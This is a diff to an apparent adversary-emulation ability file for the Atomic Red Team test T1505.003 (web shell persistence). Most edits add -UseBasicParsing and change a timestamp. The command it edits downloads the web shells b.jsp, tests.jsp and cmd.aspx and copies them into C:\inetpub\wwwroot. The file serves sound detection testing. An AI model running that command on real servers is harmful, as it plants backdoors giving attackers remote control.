@@ -16,11 +16,12 @@
         command: 'if (Test-Path "PathToAtomicsFolder\T1505.003\src") {exit 0} else
           {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1505.003\src"
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"
-          -OutFile "PathToAtomicsFolder\T1505.003\src/b.jsp"; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"
-          -OutFile "PathToAtomicsFolder\T1505.003\src/tests.jsp"; Invoke-WebRequest
-          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"
-          -OutFile "PathToAtomicsFolder\T1505.003\src/cmd.aspx"; fi; xcopy /I /Y "PathToAtomicsFolder\T1505.003\src"
-          C:\inetpub\wwwroot'
+          -OutFile "PathToAtomicsFolder\T1505.003\src/b.jsp" -UseBasicParsing; Invoke-WebRequest
+          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"
+          -OutFile "PathToAtomicsFolder\T1505.003\src/tests.jsp" -UseBasicParsing;
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"
+          -OutFile "PathToAtomicsFolder\T1505.003\src/cmd.aspx" -UseBasicParsing;
+          fi; xcopy /I /Y "PathToAtomicsFolder\T1505.003\src" C:\inetpub\wwwroot'
         cleanup: 'del #{web_shell_path}\b.jsp /q >nul 2>&1; del #{web_shell_path}\tests.jsp
           /q >nul 2>&1; del #{web_shell_path}\cmd.aspx /q >nul 2>&1'
   plugin: atomic
@@ -29,9 +30,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1505.003
   - persistence
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -54,15 +55,15 @@
         | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"
-        -OutFile "#{web_shells}/b.jsp"
+        -OutFile "#{web_shells}/b.jsp" -UseBasicParsing
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"
-        -OutFile "#{web_shells}/tests.jsp"
+        -OutFile "#{web_shells}/tests.jsp" -UseBasicParsing
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"
-        -OutFile "#{web_shells}/cmd.aspx"
+        -OutFile "#{web_shells}/cmd.aspx" -UseBasicParsing
 
         '
     technique_created: '2019-12-13T16:46:18.927Z'
     atomic_guid: 0a2ce662-1efa-496f-a472-2fe7b080db16
-    import_timestamp: '2026-10-20T07:08:28.754719Z'
+    import_timestamp: '2026-10-21T07:01:50.870385Z'
